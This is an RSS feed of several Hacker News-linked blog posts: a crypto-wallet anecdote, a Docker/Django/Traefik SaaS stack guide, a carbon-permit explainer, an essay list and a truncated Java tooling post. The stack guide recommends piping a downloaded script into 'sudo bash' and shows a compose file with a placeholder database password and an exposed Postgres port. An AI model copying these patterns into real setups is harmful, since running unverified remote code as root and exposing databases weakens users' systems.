      replaced.</p>
    <p><em>To this day</em>, whenever I find an old harddrive, or boot up an old computer, I make an exhaustive search,
      trying to locate this old wallet.dat file.
      I have repressed the traumatic memory of calculating how much I potentially had, but I faintly remember it being
      in the millions. 💸💸💸💸</p>
    <p>I try to tell myself, that it is as if I got it paid out all those years ago. As if I got them paid out, and
      spent them all on beer. It is what I would have done anyhow.</p>
    <p>But it still hurts a bit. 😅</p>
    <p>... Okay not a bit, a lot.</p>
    <hr>
    <p>The day before yesterday, on the 28th of January 2021, I had to do some work on our Office 365 email system. For
      <em>some</em> reason, the only way to create DKIM keys for a domain, is via PowerShell. So I had to bust out an
      old laptop that runs Windows.</p>
    <p>I bought it second-hand back in 2013, so there was no way the Bitcoin wallet was to be found there. But logic be
      damned, we're talking about millions here. Couldn't hurt to do an exhaustive search.</p>
    <p>First step, search for "wallet" in AppData. It finds a bunch of stuff - like some images used by Google
      Chrome. And then, at the very bottom:</p>
    <blockquote>
      <p><strong>wallet.dat</strong></p>
    </blockquote>
    <p>To my surprise, I had actually found a wallet.dat file. 💰💰💰</p>
    <p>I immediately backed it up, and with my stomach bursting with butterflies, I began trying to recover it.</p>
    <p>Only to find, that it was a password-protected Dogecoin wallet.</p>
    <p>I don't even remember trying out Dogecoin. But apparently I did.</p>
    <p>I searched for ways to recover Dogecoin wallets, and to my surprise, it has been skyrocketing as of late!</p>
    <p>... But according to the results, I have no way of accessing the wallet, because I have no fucking clue what the
      password is. 💸💸💸💸</p>
    <p>I tell myself it's empty. But I'll never be able to find out for certain. It's the uncertainty that's
      the worst.</p>
    <p><strong>Woe is me.</strong></p>
    <hr>
    <p>My experiences with crypto are not <em>all</em> bad, though. I bought some Bitcoins back in 2018, after they had
      thouroughly crashed, and earned a solid sum when they exploded once again a couple of weeks back.</p>
    <p>But I'll never buy crypto again. Ever!</p>
    <p><small>... I think.</small></p>

  </article>
</section></div>]]>
            </description>
            <link>https://akseltorgard.com/skriv/2021-01-30_crypto.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25973260</guid>
            <pubDate>Sat, 30 Jan 2021 21:38:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Docker, Django, Traefik, and IntercoolerJS: My go-to stack for building a SaaS]]>
            </title>
            <description>
<![CDATA[
Score 215 | Comments 212 (<a href="https://news.ycombinator.com/item?id=25973242">thread link</a>) | @simplecto
<br/>
January 30, 2021 | https://www.simplecto.com/docker-django-traefik-intercoolerjs-is-my-stack-for-2021/ | <a href="https://web.archive.org/web/*/https://www.simplecto.com/docker-django-traefik-intercoolerjs-is-my-stack-for-2021/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<!--kg-card-begin: html--><p>This article has been updated. It was previously dated for 2020. Very little has changed, but I call it out where needed.
</p><!--kg-card-end: html--><p>In case you are wondering, that SaaS is Curabase:</p><p><a href="https://www.curabase.com/">https://www.curabase.com</a></p><figure><a href="https://www.curabase.com/"><div><p>Curabase: We make it easy to curate, collaborate, and share bookmarks.</p><p>Curabase makes group bookmarking easier, the same way that Github eases the pain of software development collaboration easier.</p><p><img src="https://www.curabase.com/static/images/favicon/favicon-color-194.png"><span>Curabase</span></p></div><p><img src="https://www.curabase.com/static/images/curabase-opengraph-image.jpg"></p></a></figure><hr><p>I recently published some thoughts on <a href="https://www.simplecto.com/docker-django-traefik-intercoolerjs-is-my-stack-for-2020/">Django being a great framework for applications</a>. This post expands on that to include the other pieces of infrastructure from development to production environments.</p><p>I have used this stack (or ones that look a lot like it) to build small SaaS apps in 2018, 2019, 2020, and now in 2021.</p><h3 id="my-entire-stack">My entire stack</h3><ul><li>Linux Server/VM Hosted anywhere (I like Azure, Digital Ocean, or Scaleway) <em>(edit: 2021 – I'm in the process of moving everything over to a dedicated server at <a href="https://www.hetzner.com/">Hetzner</a>.)</em></li><li>Docker. Just plain docker</li><li>Traefik for reverse proxy and TLS with LetsEncrypt</li><li>Postgresql running in docker</li><li>Django in a container</li><li>Intercoolerjs for easy and slick Ajax-like front-end work <em>(Edit: 2021 - the creator of intercooler has released <a href="https://htmx.org/">HTMX</a>, the successor to IntercoolerJS.)</em></li><li>Sentry for catching production bugs (easy three-lines added to your config)</li><li>Bitbucket pipelines for CI/CD <em>(Edit: 2021 - I no longer bother with CI / CD for personal projects. It it too much tooling for no benefit)</em></li><li>ZeroTier for VPN/ControlPlane</li></ul><p>For smaller projects I run tests locally in docker containers and then push directly into production. I &nbsp;don't bother with full CI/CD because I don't need the complexity of it all. That said, I do like Bitbucket Pipelines.</p><figure><img src="https://www.simplecto.com/content/images/2020/02/mytechstack.jpg" alt=""><figcaption>A simple diagram of my go-to tech stack</figcaption></figure><!--kg-card-begin: markdown--><p>Woah! that is a lot to unpack here. Let's visualize this another way.</p>
<ul>
<li>Virtual Machine
<ul>
<li>Docker
<ul>
<li>Django
<ul>
<li>Volume mounted data disks</li>
</ul>
</li>
<li>Workers (Long-running django commands)
<ul>
<li>Volume mounted data disks</li>
</ul>
</li>
<li>Postgres
<ul>
<li>Volume-mounted data disks</li>
</ul>
</li>
<li>Traefik</li>
</ul>
</li>
<li>Zero-Tier</li>
<li>SSH</li>
</ul>
</li>
</ul>
<p>Was this helpful? Let me know...</p>
<!--kg-card-end: markdown--><h3 id="hosting">Hosting</h3><p>Your stuff needs a home (yes, even in the "serverless" world. LOL). My personal preferences are <a href="https://azure.com/">Azure</a>, <a href="https://m.do.co/c/c844c6492d23">Digital Ocean</a> <em>(affiliate link)</em>, or <a href="https://scaleway.com/">Scaleway</a>. They each offer enough compute, networking options, storage, and basic services to build out proofs-of-concept or whatever you might need.</p><p>Another honorable mention here is <a href="https://hetzner.com/">Hetzner</a>. They offer a good level of hardware, service and price.</p><h3 id="the-virtual-machines">The Virtual Machines</h3><p>For those side projects and many enterprise applications, <strong>scale is not an issue</strong>. That means that I will not serve thousands of simultaneous users or handling terabytes of data. Therefore I can get by on the smaller offerings – usually under $20/month. Even Azure (the most expensive of the three) offer their burstable VMs. Generally I like to go with <a href="https://www.scaleway.com/en/virtual-instances/development/">Scaleway's Developer line of servers</a>.</p><p><em><strong>Notice that Kubernetes is missing from my stack? When scale is not an issue then you don't need Kubernetes.</strong></em></p><h3 id="docker-just-plain-docker-">Docker. Just plain Docker.</h3><p>I do not rely on the OS vendor (Ubuntu) to make sure that I run the latest Docker on new VMs. Therefore I use the nice little <code>curl|bash</code> technique.</p><pre><code>curl -s https://get.docker.com | sudo bash</code></pre><p>This cure one-liner will get the best and most recent version for your machine running.</p><h3 id="traefik-for-reverse-proxy">Traefik for Reverse Proxy</h3><p>Traefik has been a God-send since I found it. Nginx is great, but it was not built for the Docker universe. Traefik has two killer features that have saved me hours upon hours:</p><ol><li>Automatic TLS with LetsEncrypt. Literally set-it-and-forget-it. With the right API keys and DNS provider you can also do verification with DNS.</li><li>Automatic no-reload configuration using docker labels. When you spin up new services Traefik will pickup the changes automatically because it listens to all Docker-related events. This makes it incredibly convenient to add, remove, or merge services as needed without any hassle.</li></ol><p>My only comment on Traefik is that there is a bit of a learning curve. You have to decide how you want to configure it (config file, command line options, yaml, or docker labels, or use a combination!)</p><!--kg-card-begin: html--><p>Another note here: I have already <a href="https://www.simplecto.com/traefik-2-0-docker-and-letsencrypt/" title="Traefik 2 production ready configurations">published my production configuations for Traefik</a> here.</p><!--kg-card-end: html--><h3 id="postgres-for-database">Postgres for Database</h3><p>Tried and True, PostgreSQL has never let me down. I usually attach one of these containers to a project that needs it without any difficulty. I simply spin up the container, bind the ports, and then bind the data volume to my host disk. Done and Done.</p><!--kg-card-begin: markdown--><h3 id="dockercomposeyml">docker-compose.yml</h3>
<pre><code>version: '3.1'

services:

  db:
    container_name: postgres
    hostname: postgres
    image: postgres:11
    restart: always
    environment:
      POSTGRES_PASSWORD: secretsonly
    volumes:
      - ./data:/var/lib/postgresql/data
    ports:
      - 5432:5432
    networks:
      - web

networks:
    web:
        external: true
</code></pre>
<!--kg-card-end: markdown--><h3 id="dockerized-django-for-web">Dockerized Django for Web</h3><p>Docker deploys nicely in a container, and I have been doing it for a few years now. The benefits of matching your development environment to your production one cannot be overstated, and I have Docker to thank for that.</p><p>Edit: 2021, I've got a reference Django project up that I use as my template for new projects: <a href="https://github.com/simplecto/django-reference-implementation">https://github.com/simplecto/django-reference-implementation</a></p><h3 id="django-commands-for-asynchronous-tasks">Django commands for Asynchronous tasks</h3><p>Also, for asynchronous tasks I simply use <a href="https://docs.djangoproject.com/en/3.0/howto/custom-management-commands/">custom Django commands</a> which are a part of the standard framework. The pattern here is a simple <code>while</code> loop with a <code>sleep()</code> period. It polls the database for relevant actions and then does it's thing. &nbsp;</p><p>Edit: 2021 - This has paid off in a big way. I have been running a website screenshot project for over a year now with this pattern. It takes about 1500 website screenshots per day. All of it is scheduled and managed by a Django command.</p><p>That project lives here: https://github.com/simplecto/screenshots</p><h3 id="intercoolerjs-because-who-needs-the-complexity">IntercoolerJS, because who needs the complexity?</h3><p>I have a lot to say about this, but that will have to go into a series of posts. The tldr; here that I use this lovely little javascript library along with jQuery (<em>yeah, it is 2020, and I still use jQuery</em>) to make parts of my applications <em>feel</em> like single-page-apps but not really.</p><p>IntercoolerJS keeps that old-school "Ajax" (remember that word) goodness and allows me to update the DOM with HTML from the backend. It is seamless, smooth, and really convenient for things like logins and small form updates.</p><p>I strongly suggest you check it out: <a href="https://intercoolerjs.org/">Learn more about IntercoolerJS</a></p><p>Edit 2021: The creator has released <a href="https://htmx.org/">HTMX</a>, the successor to IntercoolerJS.</p><h3 id="sentry-to-catch-production-errors">Sentry to catch production errors</h3><p>I make mistakes. Lots of mistakes--but there is no need to show them to my users, right? Sentry gives me an easy and convenient way to capture production bugs as they happen. Some cool things about them:</p><ol><li>Open source-ish (<a href="https://blog.sentry.io/2019/11/06/relicensing-sentry">relicensed here</a>), so you can host yourself if that is your thing.</li><li>Easy few lines added to your <code>settings.py</code> file in Django and that is it.</li><li>Tight integration to your Git repos and Issue tracking systems for full production defect traceability.</li></ol><p>Another nice thing is that you can disable it for development.</p><p><a href="https://sentry.io/">Check out Sentry here</a>.</p><h3 id="bitbucket-pipelines-for-ci-cd">Bitbucket Pipelines for CI/CD</h3><p>Edit: 2021 - I no longer use CI/CD for deployment of my one-man projects. It is too much tooling and complexity. I simply run tests with PyCharm and ship directly to production from my development machine.</p><p>There are so many CI/CD offerings out there today, but I have been happy with Bitbucket's offering called Pipelines. They offer you a few hundred minutes free every month with the option to top-up as needed for a small fee. I have rarely had problems, and I really enjoy their YAML configuraiton / directive files. </p><p>Using the <code>bitbucket-pipelines.yml</code> file I have been able to do full end-to-end testing by spinning up multiple docker containers, loading the databases, and running hundreds of test in just a few minutes. This was key in speeding things up in our team and enabling 5+ pushes to production per day.</p><p><a href="https://bitbucket.org/">Checkout Bitbucket here</a>.</p><h3 id="zerotier-for-vpn-control-plane">ZeroTier for VPN/Control Plane</h3><p>Finally, we come to the bit of tech that is largely optional but nice to have. &nbsp;Zerotier is a unique kind of network/VPN that I use to link all my personal machines. It works though firewalls (at home, in office) and offers an easy 1 minute setup.</p><p>Using ZeroTier in my last company we were able to remove the SSH Jump Servers which caused a headache in terms of key management and shared bandwidth on a single machine.</p><p>Zerotier work on Linux, Mac, Windows, Android, and iPhone, so you are pretty much covered.</p><p>The one downside to ZeroTier is that I don't entirely understand how it works. It is a lot like MacOS or iPhone in that it "just works" as expected and I rarely (never) have problems. That is a strength from a user experience perspective but a WTF? from a CTO perspective. </p><h3 id="conclusion">Conclusion</h3><p>Hopefully this deeper-dive will prompt some interest and curiosity about Docker, Django, Traefik, and especially IntercoolerJS. It is simple, easy to work with, and allows you to grow out of it when the time comes.</p><p>Edit 2021 - As you can see not a lot has changed. I've been able to add more code to my public repositories that flesh out the ideas expressed here over a year ago.</p>
			</section></div>]]>
            </description>
            <link>https://www.simplecto.com/docker-django-traefik-intercoolerjs-is-my-stack-for-2021/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25973242</guid>
            <pubDate>Sat, 30 Jan 2021 21:35:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[r/WallStreetBets vs. Gamestop For Renewable Energy]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25973076">thread link</a>) | @evanmaynard1
<br/>
January 30, 2021 | https://info.kotoo.earth/hc/en-us/articles/360056568874 | <a href="https://web.archive.org/web/*/https://info.kotoo.earth/hc/en-us/articles/360056568874">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="main-content">
      <header>
        

        <div>
          
            <div>
              
                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" focusable="false" viewBox="0 0 12 12">
                  <path fill="currentColor" d="M6 0C2.7 0 0 2.7 0 6s2.7 6 6 6 6-2.7 6-6-2.7-6-6-6zm0 2c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm2.3 7H3.7c-.3 0-.4-.3-.3-.5C3.9 7.6 4.9 7 6 7s2.1.6 2.6 1.5c.1.2 0 .5-.3.5z"></path>
                </svg>
              
              <p><img src="https://info.kotoo.earth/system/photos/361900906074/Headshot1.JPG" alt="">
            </p></div>
          
          
        </div>

        
          
        
      </header>

      <section>
        <div>
          <div><p><strong>Coming from HackerNews? Link should go to: <a href="https://info.kotoo.earth/hc/en-us/articles/360062548413-r-WallStreetBets-vs-Gamestop-For-Renewable-Energy" target="_blank" rel="noopener">r/WallStreetBets vs. Gamestop For Renewable Energy</a></strong></p>


<p><strong>Summary</strong><span>:&nbsp;</span></p>
<p><span>One way that some states are combating emissions is by selling a fixed number of pollution permits to power plants. Currently, governments reduce the number or pollution permits by 3% each year to force power plants to find cleaner ways to operate (more efficient power plants, renewable energy, etc.)&nbsp;</span></p>

<p><span>Kotoo allows individuals to help lower emissions faster because permits Kotoo buys become unavailable to power plants, forcing them to reduce their emissions.&nbsp;</span></p>

<p><span>Imagine the government has a concert venue and it’s throwing a renewable energy benefit concert by a band called Carbon Dioxide (CO2). All the power plants have attended the CO2 concert for decades. Some people want power plants to attend a concert by a new band called Renewable Energy so they buy and shred the tickets to the CO2 concert so that the power plants can’t attend. Since the power plants can’t do without music - they go to the Renewable Energy concert instead. They learn that Renewable Energy is so good (it’s cheaper!) that they never go back to the Carbon Dioxide concert. Eventually all the seats in Carbon Dioxide concert are empty so the band stops playing and shredding tickets is no longer needed.</span></p>

<p><span>While the Renewable Energy fans could just go to the RE concert - buying out the CO2 tickets still builds renewable energy since it’s a benefit concert while also preventing CO2 from being emitted. It ultimately converts old CO2 enthusiasts rather than waiting for Renewable Energy to become so dominant it overtakes CO2.&nbsp;</span></p>

<p><strong>Related:&nbsp;</strong></p>
<p><span><a href="https://info.kotoo.earth/hc/en-us/articles/360058439833" target="_self">Why powerplants are the key to climate change</a></span></p>


<p><strong>Details</strong><span>:</span></p>
<p><span>Another way to think about emissions is by thinking about fuel because emissions are directly related to fuel burned.* But some powerplants get more electricity out of a given amount of fuel - just like how different cars go different distances on the same amount of fuel. So we can think about power plant emissions just like how you might think about gas mileage - some go further than others but the ones that are more efficient are more expensive.&nbsp;</span></p>

<p><span>Let’s say that there was a fixed amount of fuel available every three months. Every three months, everyone shows up to buy the fuel but there's only a set amount available. Since people want more fuel than is available - the government sets up an auction and sells it to the highest bidders.&nbsp;</span></p>

<p><span>People who have less efficient, and therefore cheaper, equipment have more money for fuel but they need to buy more of it. And those that have more efficient equipment need less and may save money even though their equipment cost them more up front.&nbsp;</span></p>

<p><span>Over time, the amount of fuel available decreases so if the amount of fuel people require doesn’t change, then the fuel gets more expensive. However, the more expensive the fuel, the more it makes sense for people to upgrade to more efficient machines to save money on fuel or run the risk of not being able to operate.&nbsp;</span></p>

<p><span>The beauty of this is that everyone can choose an upgrade system that works for them on a time horizon that makes sense for them regardless of what type of fuel they need. And there is more than one option, here are a few:</span></p>
<ul>
<li><span>they can stop making electricity</span></li>
<li><span>they can operate their power plant more efficiently with the fuel they have</span></li>
<li><span>they can pay for upgrades to their plant to make their fuel go further. This costs money up front but saves them money when they have to buy less fuel.</span></li>
<li><span>they can build a fuel free power plant (aka renewable energy) which also costs money but saves them money on fuel</span></li>
</ul>

<p><span>Lastly, while all this is happening, the money raised from the auction are spent building new fuel free powerplants and helping people use less electricity - so those that need the fuel are also building a future in which no fuel is needed.</span></p>

<p><span>Kotoo allows individual people to drive this change faster by showing up to the auction and buying permits that we don’t plan to use. This makes less fuel available and increases the price. As prices increase, power plants will save more and more money by making one of the 4 choices above. And as prices increase more and more money is available to build fuel free powerplants.</span></p>

<p><span>*For a certain type of fuel, it is mostly true that a gallon of that fuel will always make the same emissions. Combustion nerds (aka the author) know that it is possible to burn fuels in dirty and clean ways but the analogy holds because technology to burn fuel more cleanly usually costs more money because it is newer. It is also true that different types of fuels create dramatically different amounts of emissions (coal is twice as dirty as natural gas) but more fuel always means more emissions and outside of this analogy, the price is set by emissions so it’s robust to how fuel is burned and what type of fuel is being burned</span></p>
</div>

          
        </div>
      </section>

      

      
      
        
      
    </article></div>]]>
            </description>
            <link>https://info.kotoo.earth/hc/en-us/articles/360056568874</link>
            <guid isPermaLink="false">hacker-news-small-sites-25973076</guid>
            <pubDate>Sat, 30 Jan 2021 21:16:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My favorite essays of life advice]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25973075">thread link</a>) | @coolvision
<br/>
January 30, 2021 | https://lw2.issarice.com/posts/zMmQdob3eFfeMh7D3/my-favorite-essays-of-life-advice | <a href="https://web.archive.org/web/*/https://lw2.issarice.com/posts/zMmQdob3eFfeMh7D3/my-favorite-essays-of-life-advice">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper"><div id="content"><p>
post by <a href="https://lw2.issarice.com/users/benkuhn">benkuhn</a> ·
2020-12-23T23:00:10.832Z ·
<a title="Official LessWrong 2.0 link" href="https://www.lesswrong.com/posts/zMmQdob3eFfeMh7D3/my-favorite-essays-of-life-advice">LW</a> · <a title="GreaterWrong link" href="https://www.greaterwrong.com/posts/zMmQdob3eFfeMh7D3/my-favorite-essays-of-life-advice">GW</a> ·
<a href="#comments">17 comments</a></p><p>I start each of my <a href="https://www.benkuhn.net/weekly/">weekly reviews</a> by re-reading one of my favorite essays of life advice—a different one each week. It’s useful for a few different reasons:</p>
<ul>
<li>
<p>It helps me get into the right reflective frame of mind.</p>
</li>
<li>
<p>The best essays are dense enough with useful advice that I find new interesting bits every time I read them.</p>
</li>
<li>
<p>Much good advice is <a href="https://tjcx.me/posts/defense-self-help/" target="_blank">easy to understand, but hard to implement</a>. So to get the most benefit from it, you should find whatever version of it most resonates you and then <em>re-read it frequently</em> to keep yourself on track.</p>
</li>
</ul>
<p>I’ve collected my favorite essays for re-reading below. I’ll keep this updated as I find more great essays, and I’d welcome other contributions—please suggest your own favorites in the comments!</p>
<p>There's a lot of essays here! If you'd like, I can email you one essay every weekend, so you can read it before your weekly review:
<a href="https://www.benkuhn.net/weeklyessays/">(sign up on site)</a></p>
<hr>
<p>Paul Graham, <a href="http://paulgraham.com/vb.html" target="_blank">Life is Short</a>. Inspire yourself never to waste time on bullshit again:</p>
<blockquote>
<p>Having kids showed me how to convert a continuous quantity, time, into discrete quantities. You only get 52 weekends with your 2 year old. If Christmas-as-magic lasts from say ages 3 to 10, you only get to watch your child experience it 8 times. And while it’s impossible to say what is a lot or a little of a continuous quantity like time, 8 is not a lot of something. If you had a handful of 8 peanuts, or a shelf of 8 books to choose from, the quantity would definitely seem limited, no matter what your lifespan was.</p>
<p>Ok, so life actually is short. Does it make any difference to know that?</p>
<p>It has for me. It means arguments of the form “Life is too short for x” have great force. It’s not just a figure of speech to say that life is too short for something. It’s not just a synonym for annoying. If you find yourself thinking that life is too short for something, you should try to eliminate it if you can.</p>
<p>When I ask myself what I’ve found life is too short for, the word that pops into my head is “bullshit.” I realize that answer is somewhat tautological. It’s almost the definition of bullshit that it’s the stuff that life is too short for. And yet bullshit does have a distinctive character. There’s something fake about it. It’s the junk food of experience. [1]</p>
<p>If you ask yourself what you spend your time on that’s bullshit, you probably already know the answer. Unnecessary meetings, pointless disputes, bureaucracy, posturing, dealing with other people’s mistakes, traffic jams, addictive but unrewarding pastimes.</p>
</blockquote>
<p>I’ve found that unless I’m vigilant, the amount of bullshit in my life only ever increases. Rereading <em>Life is Short</em> every so often gives me a kick in the pants to figure out what <em>really</em> matters and how to get the bullshit levels back down.</p>
<hr>
<p>Derek Sivers, <a href="https://sivers.org/kimo" target="_blank">There is no speed limit</a>, in which he learns a semester’s worth of music theory in an afternoon:</p>
<blockquote>
<p>Within a minute, he started quizzing me. “If the 5-chord with the flat-7 has that tri-tone, then so does another flat-7 chord. Which one?”</p>
<p>“Uh… the flat-2 chord?”</p>
<p>“Right! So that’s a substitute chord. Any flat-7 chord can be substituted with the other flat-7 that shares the same tri-tone. So reharmonize all the chords you can in this chart. Go.”</p>
<p>The pace was intense, and I loved it. Finally, someone was challenging me — keeping me in over my head — encouraging and expecting me to pull myself up quickly. I was learning so fast, it felt like the adrenaline rush you get while playing a video game. He tossed every fact at me and made me prove that I got it.</p>
<p>In our three-hour lesson that morning, he taught me a full semester of Berklee’s harmony courses.</p>
</blockquote>
<p>This was one of the major inspirations for <a href="https://www.benkuhn.net/impatient/">Be impatient</a>. Every time I reread it, I think of at least one thing where I’m setting myself a speed limit for no reason!</p>
<hr>
<p>Sam Altman, <a href="https://blog.samaltman.com/how-to-be-successful" target="_blank">How To Be Successful</a>. Sam might have observed more successful people more closely than anyone else on the planet, and the advice is as good as you’d expect.</p>
<blockquote>
<p>Focus is a force multiplier on work.</p>
<p>Almost everyone I’ve ever met would be well-served by spending more time thinking about what to focus on. It is much more important to work on the right thing than it is to work many hours. Most people waste most of their time on stuff that doesn’t matter.</p>
<p>Once you have figured out what to do, be unstoppable about getting your small handful of priorities accomplished quickly. I have yet to meet a slow-moving person who is very successful.</p>
</blockquote>

<blockquote>
<p>Almost always, the people who say “I am going to keep going until this works, and no matter what the challenges are I’m going to figure them out”, and mean it, go on to succeed. They are persistent long enough to give themselves a chance for luck to go their way.</p>
<p>… To be willful, you have to be optimistic—hopefully this is a personality trait that can be improved with practice. I have never met a very successful pessimistic person.</p>
</blockquote>
<p>There are lots of different points here, so this one especially bears rereading!</p>
<hr>
<p>R. W. Hamming, <a href="https://www.cs.utexas.edu/users/dahlin/bookshelf/hamming.html" target="_blank">You and your research</a>. Hamming observed almost as many great scientists as Sam Altman did founders. He had some interesting conclusions:</p>
<blockquote>
<p>At first I asked what were the important problems in chemistry, then what important problems they were working on, or problems that might lead to important results. One day I asked, “if what they were working on was not important, and was not likely to lead to important things, they why were they working on them?” After that I had to eat with the engineers!</p>
<p>About four months later, my friend stopped me in the hall and remarked that my question had bothered him. He had spent the summer thinking about the important problems in his area, and while had had not changed his research he thought it was well worth the effort. I thanked him and kept walking. A few weeks later I noticed that he was made head of the department. Many years later he became a member of the National Academy of Engineering. The one person who could hear the question went on to do important things and all the others—so far as I know—did not do anything worth public attention.</p>
<p>… Some people work with their doors open in clear view of those who pass by, while others carefully protect themselves from interruptions. Those with the door open get less work done each day, but those with their door closed tend not know what to work on, nor are they apt to hear the clues to the missing piece to one of their “list” problems. I cannot prove that the open door produces the open mind, or the other way around. I only can observe the correlation. I suspect that each reinforces the other, that an open door will more likely lead you and important problems than will a closed door.</p>
</blockquote>

<blockquote>
<p>There is another trait that took me many years to notice, and that is the ability to tolerate ambiguity. Most people want to believe what they learn is the truth: there are a few people who doubt everything. If you believe too much then you are not likely to find the essentially new view that transforms a field, and if you doubt too much you will not be able to do much at all. It is a fine balance between believing what you learn and at the same time doubting things. Great steps forward usually involve a change of viewpoint to outside the standard ones in the field.</p>
<p>While you are leaning things you need to think about them and examine them from many sides. By connecting them in many ways with what you already know…. you can later retrieve them in unusual situations. It took me a long time to realize that each time I learned something I should put “hooks” on it. This is another face of the extra effort, the studying more deeply, the going the extra mile, that seems to be characteristic of great scientists.</p>
</blockquote>
<p>Hamming is an unusual combination of (a) a great scientist himself, (b) curious and thoughtful about what makes others great, and (c) honest and open about his observations (it seems).</p>
<hr>
<p>Anonymous, <a href="https://autotranslucence.wordpress.com/2018/03/30/becoming-a-magician/" target="_blank">Becoming a Magician</a>—on how to become a person that your current self would perceive as magical:</p>
<blockquote>
<p>The description was about five or six handwritten pages long, and at the time, it was a manifestation of desperate longing to be somewhere other than where I was, someone who felt free and cared for. At the time I saw that description as basically an impossibility; my life could never be so amazing in reality.</p>
<p>Fast forward about seven or ten years and I rediscovered the description when I was moving old notebooks and journals from one dusty storage spot to another. As I read through it, I discovered that 90% of the statements I had made in that description were true (or true in spirit). … It was incredible to me, despite all the changes that had happened in my life since when I wrote the passage, that I had basically become the person whose life I had dreamed of living as a teenager.</p>
<p>That’s pretty fucking cool.</p>
</blockquote>

<blockquote>
<p>And then came Sanatan Dinda. An Indian visual artist from Kolkata, he didn’t even make the finals the first year he competed, and the next year he placed second with a style that broke half a dozen of the implicit rules of ‘good artwork’ at the competition. … [T]he third year he came he won the entire competition by something like ten percent of the total awarded points over the next artist in second place.</p>
<p>… The thing that confused me though was this – I could not work out how he did it. Like, I had zero mental model of how he created that piece in the same timeframe we all had; how he came up with it, designed it, practiced it. Even though he placed first and I placed fifth and logically we both existed on a scale of ‘competence at bodypainting’ it seemed like the skills required were completely different.</p>
</blockquote>
<p>The exercise they suggest is a really useful activity for weekly (or monthly or yearly) reviews. Highly recommended!</p>
<hr>
<p>Dan Luu, <a href="https://danluu.com/p95-skill/" target="_blank">95th percentile isn’t that good</a>. Great for cultivating self-improvement mindset by reminding you how easy (in some sense) it is to make huge improvements at something:</p>
<blockquote>
<p>Reachin…</p></blockquote></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lw2.issarice.com/posts/zMmQdob3eFfeMh7D3/my-favorite-essays-of-life-advice">https://lw2.issarice.com/posts/zMmQdob3eFfeMh7D3/my-favorite-essays-of-life-advice</a></em></p>]]>
            </description>
            <link>https://lw2.issarice.com/posts/zMmQdob3eFfeMh7D3/my-favorite-essays-of-life-advice</link>
            <guid isPermaLink="false">hacker-news-small-sites-25973075</guid>
            <pubDate>Sat, 30 Jan 2021 21:16:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Quadratic-vote-ranked list of gamestop short-squeeze narratives]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25973006">thread link</a>) | @mitya777
<br/>
January 30, 2021 | https://knovigator.com/quest/gamestop-wallstreetbets-GME-robinhood-narratives-4o62ex4g | <a href="https://web.archive.org/web/*/https://knovigator.com/quest/gamestop-wallstreetbets-GME-robinhood-narratives-4o62ex4g">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://knovigator.com/quest/gamestop-wallstreetbets-GME-robinhood-narratives-4o62ex4g</link>
            <guid isPermaLink="false">hacker-news-small-sites-25973006</guid>
            <pubDate>Sat, 30 Jan 2021 21:07:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[View on mobile – View any website mobile version from desktop]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25972862">thread link</a>) | @azabraao
<br/>
January 30, 2021 | https://azabraao.me/view-on-mobile | <a href="https://web.archive.org/web/*/https://azabraao.me/view-on-mobile">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://azabraao.me/view-on-mobile</link>
            <guid isPermaLink="false">hacker-news-small-sites-25972862</guid>
            <pubDate>Sat, 30 Jan 2021 20:51:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Java Version Management on macOS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25972845">thread link</a>) | @bendiksolheim
<br/>
January 30, 2021 | https://www.bendik.dev/posts/java-version-management-on-macos/ | <a href="https://web.archive.org/web/*/https://www.bendik.dev/posts/java-version-management-on-macos/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    


<p>January 30, 2021 – 5 minute read</p>
<section>
<p>With the increased frequency of Java releases handling multiple versions on a single machine is more and more relevant. Solutions already exists, such as the widely used <a href="https://www.jenv.be/">jenv</a> – my goto tool for a long time. For a number of reasons, I recently decided to throw it out of my system and build a solution myself. The result is a few small functions which handles most of my needs.</p>
<span id="continue-reading"></span>
<p><em>(Tldr; if you just want the code, <a href="https://www.bendik.dev/posts/java-version-management-on-macos/#a-solution">just scroll down</a>)</em></p>
<p>My biggest issue was the startup time on new shells. It’s a <a href="https://github.com/jenv/jenv/issues/148">known issue</a>, with several workarounds, but at least to me they all affect my startup time noticably. Now, I might be an impatient guy, I’ll admit that, but I just can’t stand spending time on something that I feel should happen instantly.</p>
<p>My second biggest issue was the troubleshooting. I practically live in my terminal, so problems have a big effect on my productivity. For that reason (and others, I’m sure), I tend to like simple solutions. Fewer blows and whistles, fewer weird problems. Without going into too much detail, I feel that jenv has made a few weird decisions that has ended up with me spending precious time debugging and troublehooting. I am sure these decisions are made for good reasons, so no hard feelings there, but it aligns badly with my love for simplicity.</p>
<h2 id="requirements">Requirements</h2>
<p>So I implemented my own solution. Because as you know, the rational solution to spending too much time on a problem is spending even <em>more</em>. But hey, it resulted in me writing this blog post so I guess there’s that.</p>
<p>My needs are quite simple</p>
<ul>
<li>I want the <code>java</code> command always available</li>
